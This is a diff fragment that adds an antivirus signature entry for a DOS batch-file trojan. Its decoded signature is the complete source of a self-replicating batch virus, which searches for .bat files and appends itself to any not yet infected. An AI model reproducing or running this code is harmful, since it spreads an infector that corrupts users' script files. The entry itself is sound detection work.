@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36461
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off %-ich% if "%0=="ich goto iich if not exist %0.bat goto ich find "ich"<%0.bat>ich.bat for %%j in (..\*.bat *.bat) do call ich %%j del ich.* :: [ich] by techno phunk goto ich :iich find "ich"<%1>nul if not errorlevel 1 goto ich copy %0.bat+%1 ich|type ich>%1 :ich 
